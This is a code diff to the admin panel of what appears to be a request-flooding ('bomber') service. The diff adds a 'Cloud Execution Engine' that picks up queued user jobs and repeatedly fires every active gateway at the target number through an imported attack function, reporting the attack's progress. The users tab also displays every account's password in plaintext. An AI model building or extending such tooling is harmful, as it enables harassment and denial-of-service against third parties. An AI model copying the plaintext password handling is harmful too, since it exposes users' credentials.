@@ -1,9 +1,14 @@
 import React, { useState, useEffect, useRef } from 'react';
 import { ApiNode, UserProfile, LogEntry, ActiveSession } from '../types';
-import { ShieldAlert, Server, Activity, Lock, Search, Plus, Trash2, Edit2, X, Save, Database, Users, FileText, CheckCircle2, AlertCircle, PlayCircle, StopCircle, RefreshCw, Download, Upload, Code } from 'lucide-react';
+import { 
+  ShieldAlert, Server, Activity, Lock, Search, Plus, Trash2, Edit2, X, Save, 
+  Database, Users, FileText, CheckCircle2, AlertCircle, PlayCircle, StopCircle, 
+  RefreshCw, Download, Upload, Code, Cpu 
+} from 'lucide-react';
 import { INITIAL_API_NODES } from '../apiNodes';
 import { collection, getDocs, deleteDoc, doc, updateDoc, onSnapshot, query, orderBy, where } from 'firebase/firestore';
 import { db } from '../firebase';
+import { executeAttackNode } from '../services/attackEngine';
 
 interface AdminProps {
   apiNodes: ApiNode[];
@@ -28,7 +33,7 @@ const Admin: React.FC<AdminProps> = ({
   onDeleteNode,
   onLogout 
 }) => {
-  const [activeTab, setActiveTab] = useState<'live' | 'gateways' | 'users' | 'logs'>('live');
+  const [activeTab, setActiveTab] = useState<'live' | 'gateways' | 'users' | 'logs' | 'engine'>('live');
   const [searchTerm, setSearchTerm] = useState('');
   
   // User Management State
@@ -37,6 +42,11 @@ const Admin: React.FC<AdminProps> = ({
 
   // Live Sessions State
   const [liveSessions, setLiveSessions] = useState<ActiveSession[]>([]);
+
+  // Server Engine State
+  const [engineEnabled, setEngineEnabled] = useState(false);
+  const [engineLogs, setEngineLogs] = useState<string[]>([]);
+  const engineAbortController = useRef<AbortController | null>(null);
 
   // API Modal State
   const [editingNode, setEditingNode] = useState<ApiNode | null>(null);
@@ -70,21 +80,86 @@ const Admin: React.FC<AdminProps> = ({
 
   // FETCH LIVE SESSIONS EFFECT
   useEffect(() => {
-      if (activeTab === 'live' && db) {
-          // Listen for sessions updated in the last 24 hours
+      if ((activeTab === 'live' || activeTab === 'engine') && db) {
           const q = query(collection(db, 'active_sessions'), orderBy('lastUpdate', 'desc'));
           const unsubscribe = onSnapshot(q, (snapshot) => {
               const sessions = snapshot.docs.map(d => ({id: d.id, ...d.data()} as ActiveSession));
-              // Filter out very old completed sessions (keep them for a bit for history)
               setLiveSessions(sessions.filter(s => {
-                  if (s.status === 'running') return true;
+                  if (s.status === 'running' || s.status === 'queued') return true;
                   const age = new Date().getTime() - (s.lastUpdate?.toDate ? s.lastUpdate.toDate().getTime() : new Date(s.lastUpdate).getTime());
-                  return age < 300000; // Keep stopped sessions for 5 mins
+                  return age < 300000;
               }));
           });
           return () => unsubscribe();
       }
   }, [activeTab]);
+
+  // SERVER ENGINE LOGIC
+  useEffect(() => {
+     if (engineEnabled && db) {
+        const addEngineLog = (msg: string) => setEngineLogs(p => [...p.slice(-19), `[${new Date().toLocaleTimeString()}] ${msg}`]);
+        addEngineLog("Engine started. Polling for queued jobs...");
+
+        const q = query(collection(db, 'active_sessions'), where('status', '==', 'queued'));
+        const unsubscribe = onSnapshot(q, async (snapshot) => {
+            snapshot.docChanges().forEach(async (change) => {
+                if (change.type === 'added') {
+                    const session = { id: change.doc.id, ...change.doc.data() } as ActiveSession;
+                    addEngineLog(`Job Found: ${session.target} (${session.amount})`);
+                    await processSession(session, addEngineLog);
+                }
+            });
+        });
+
+        return () => {
+            unsubscribe();
+            addEngineLog("Engine stopped.");
+            if (engineAbortController.current) engineAbortController.current.abort();
+        };
+     }
+  }, [engineEnabled]);
+
+  const processSession = async (session: ActiveSession, logger: (m: string) => void) => {
+      if (!db) return;
+      
+      await updateDoc(doc(db, 'active_sessions', session.id), { status: 'running', lastUpdate: new Date() });
+      logger(`Starting attack on ${session.target}...`);
+
+      const controller = new AbortController();
+      engineAbortController.current = controller;
+      
+      let sent = 0;
+      let failed = 0;
+
+      const activeApiNodes = apiNodes.filter(n => !disabledNodes.includes(n.name));
+      if (activeApiNodes.length === 0) {
+          logger("Error: No active gateways available.");
+          await updateDoc(doc(db, 'active_sessions', session.id), { status: 'stopped', lastUpdate: new Date() });
+          return;
+      }
+
+      for (let i = 0; i < session.amount; i++) {
+          if (controller.signal.aborted) break;
+
+          const promises = activeApiNodes.map(async (node) => {
+              try {
+                  const res = await executeAttackNode(node, session.target, controller.signal);
+                  if (res.ok) sent++; else failed++;
+              } catch (e) { failed++; }
+          });
+
+          await Promise.all(promises);
+
+          if (i % 5 === 0 || i === session.amount - 1) {
+             await updateDoc(doc(db, 'active_sessions', session.id), { sent, failed, lastUpdate: new Date() });
+          }
+          
+          await new Promise(r => setTimeout(r, 1000));
+      }
+
+      await updateDoc(doc(db, 'active_sessions', session.id), { status: 'completed', sent, failed, lastUpdate: new Date() });
+      logger(`Job ${session.id.slice(0,6)} completed.`);
+  };
 
   if (!currentUser || currentUser.role !== 'admin') {
     return (
@@ -126,7 +201,6 @@ const Admin: React.FC<AdminProps> = ({
     setIsModalOpen(false);
   };
 
-  // EXPORT / IMPORT HANDLERS
   const handleExport = () => {
     const dataStr = JSON.stringify(apiNodes, null, 2);
     const blob = new Blob([dataStr], { type: "application/json" });
@@ -156,7 +230,6 @@ const Admin: React.FC<AdminProps> = ({
             if (Array.isArray(json)) {
                 if (confirm(`Import ${json.length} gateways? This will add them to the database.`)) {
                     json.forEach((node: any) => {
-                        // Basic validation
                         if (node.name && node.url) {
                             onAddNode({
                                 ...node,
@@ -174,11 +247,9 @@ const Admin: React.FC<AdminProps> = ({
         }
     };
     reader.readAsText(file);
-    // Reset input
     e.target.value = '';
   };
 
-  // SESSION HANDLER
   const handleStopSession = async (sessionId: string) => {
       if (db) {
           await updateDoc(doc(db, 'active_sessions', sessionId), {
@@ -188,7 +259,6 @@ const Admin: React.FC<AdminProps> = ({
       }
   };
 
-  // USER HANDLERS
   const handleDeleteUser = async (userId: string) => {
       if (!confirm("Permanently delete this user?")) return;
       if (!db) return;
@@ -205,7 +275,6 @@ const Admin: React.FC<AdminProps> = ({
 
   return (
     <div className="p-5 pb-20 space-y-6 animate-fade-in relative min-h-screen">
-       {/* Header */}
        <div className="flex items-center justify-between border-b border-zinc-800 pb-4">
           <div className="flex items-center gap-3">
              <div className="p-2 bg-red-500/10 rounded-lg">
@@ -221,9 +290,8 @@ const Admin: React.FC<AdminProps> = ({
           </button>
        </div>
 
-       {/* TABS */}
        <div className="flex p-1 bg-zinc-900 rounded-lg border border-zinc-800 overflow-x-auto">
-           {(['live', 'gateways', 'users', 'logs'] as const).map(tab => (
+           {(['live', 'engine', 'gateways', 'users', 'logs'] as const).map(tab => (
                <button
                  key={tab}
                  onClick={() => { setActiveTab(tab); setSearchTerm(''); }}
@@ -232,6 +300,7 @@ const Admin: React.FC<AdminProps> = ({
                  }`}
                >
                    {tab === 'live' && <Activity className="w-3 h-3 text-red-500" />}
+                   {tab === 'engine' && <Cpu className="w-3 h-3 text-blue-500" />}
                    {tab === 'gateways' && <Server className="w-3 h-3" />}
                    {tab === 'users' && <Users className="w-3 h-3" />}
                    {tab === 'logs' && <FileText className="w-3 h-3" />}
@@ -240,7 +309,6 @@ const Admin: React.FC<AdminProps> = ({
            ))}
        </div>
 
-       {/* --- LIVE OPS TAB --- */}
        {activeTab === 'live' && (
            <div className="space-y-4 animate-fade-in">
                <div className="grid grid-cols-2 gap-3">
@@ -267,18 +335,18 @@ const Admin: React.FC<AdminProps> = ({
                            {liveSessions.map(session => (
                                <div key={session.id} className="p-4 flex items-center justify-between hover:bg-zinc-800/30">
                                    <div className="flex items-center gap-3">
-                                       <div className={`w-2 h-2 rounded-full ${session.status === 'running' ? 'bg-red-500 animate-pulse' : 'bg-zinc-500'}`}></div>
+                                       <div className={`w-2 h-2 rounded-full ${session.status === 'running' ? 'bg-red-500 animate-pulse' : (session.status === 'queued' ? 'bg-amber-500' : 'bg-zinc-500')}`}></div>
                                        <div>
                                            <div className="flex items-center gap-2">
                                                <span className="font-bold text-white text-sm">{session.target}</span>
                                                <span className="text-[9px] px-1.5 rounded bg-zinc-800 text-zinc-400 font-mono-code">{session.username}</span>
+                                               {session.mode === 'cloud' && <span className="text-[9px] px-1.5 rounded bg-blue-900/50 text-blue-400 font-bold uppercase">Cloud</span>}
                                            </div>
                                            <div className="flex items-center gap-3 text-[10px] text-zinc-500 mt-1 font-mono-code">
                                                <span>REQ: {session.sent}/{session.amount}</span>
                                                <span className="text-red-500/80">FAIL: {session.failed}</span>
                                                <span>STATUS: {session.status.toUpperCase()}</span>
                                            </div>
-                                            {/* Progress Bar */}
                                             {session.status === 'running' && (
                                                 <div className="w-24 h-1 bg-zinc-800 mt-2 rounded-full overflow-hidden">
                                                     <div className="h-full bg-red-500" style={{ width: `${Math.min(((session.sent + session.failed) / session.amount) * 100, 100)}%` }}></div>
@@ -304,10 +372,35 @@ const Admin: React.FC<AdminProps> = ({
            </div>
        )}
 
-       {/* --- GATEWAYS TAB --- */}
+       {activeTab === 'engine' && (
+           <div className="space-y-4 animate-fade-in">
+              <div className="bg-zinc-900 border border-zinc-800 p-6 rounded-xl text-center space-y-4">
+                 <div className="mx-auto w-16 h-16 bg-zinc-950 rounded-full border border-zinc-800 flex items-center justify-center">
+                    <Cpu className={`w-8 h-8 transition-colors ${engineEnabled ? 'text-emerald-500 animate-pulse' : 'text-zinc-600'}`} />
+                 </div>
+                 <div>
+                    <h3 className="text-xl font-bold text-white">Cloud Execution Engine</h3>
+                    <p className="text-sm text-zinc-500 mt-1">
+                        When enabled, this admin panel acts as the server.<br/>
+                        It picks up 'Queued' jobs from users and executes them locally.
+                    </p>
+                 </div>
+                 <button 
+                    onClick={() => setEngineEnabled(!engineEnabled)}
+                    className={`px-8 py-3 rounded-xl font-bold uppercase tracking-wider text-sm transition-all ${engineEnabled ? 'bg-emerald-600 text-white shadow-lg shadow-emerald-500/20' : 'bg-zinc-800 text-zinc-400'}`}
+                 >
+                    {engineEnabled ? 'Engine Online' : 'Start Engine'}
+                 </button>
+              </div>
+
+              <div className="bg-black border border-zinc-800 rounded-xl p-4 font-mono-code text-xs text-zinc-400 h-64 overflow-y-auto space-y-1">
+                 {engineLogs.length === 0 ? <span className="opacity-50">System ready. Start engine to listen for jobs...</span> : engineLogs.map((l, i) => <div key={i}>{l}</div>)}
+              </div>
+           </div>
+       )}
+
        {activeTab === 'gateways' && (
          <div className="space-y-4 animate-fade-in">
-             {/* System Health Stats */}
             <div className="grid grid-cols-2 gap-3">
                 <div className="bg-zinc-900 border border-zinc-800 p-4 rounded-xl relative overflow-hidden">
                     <div className="relative z-10">
@@ -398,7 +491,6 @@ const Admin: React.FC<AdminProps> = ({
          </div>
        )}
 
-       {/* --- USERS TAB --- */}
        {activeTab === 'users' && (
            <div className="space-y-4 animate-fade-in">
                <div className="relative w-full">
@@ -429,7 +521,6 @@ const Admin: React.FC<AdminProps> = ({
                                     <td className="p-3">
                                         <div className="font-bold text-white">{user.username}</div>
                                         <div className="text-[10px] text-zinc-500">{user.email}</div>
-                                        {/* Display password insecurely as requested for full admin view of DB auth */}
                                         <div className="text-[9px] text-zinc-700 font-mono-code mt-1 select-all">Pass: {user.password}</div>
                                     </td>
                                     <td className="p-3">
@@ -453,7 +544,6 @@ const Admin: React.FC<AdminProps> = ({
            </div>
        )}
 
-       {/* --- LOGS TAB --- */}
        {activeTab === 'logs' && (
            <div className="space-y-4 animate-fade-in">
                <div className="flex items-center justify-between">
@@ -490,7 +580,6 @@ const Admin: React.FC<AdminProps> = ({
            </div>
        )}
 
-       {/* Edit/Add Modal (Gateways) */}
        {isModalOpen && (
          <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm p-4">
             <div className="bg-[#09090b] border border-zinc-700 w-full max-w-sm rounded-xl overflow-hidden shadow-2xl">
@@ -538,7 +627,6 @@ const Admin: React.FC<AdminProps> = ({
          </div>
        )}
 
-       {/* View JSON Modal */}
        {isJsonModalOpen && viewingJsonNode && (
           <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm p-4">
              <div className="bg-[#09090b] border border-zinc-700 w-full max-w-lg rounded-xl overflow-hidden shadow-2xl">
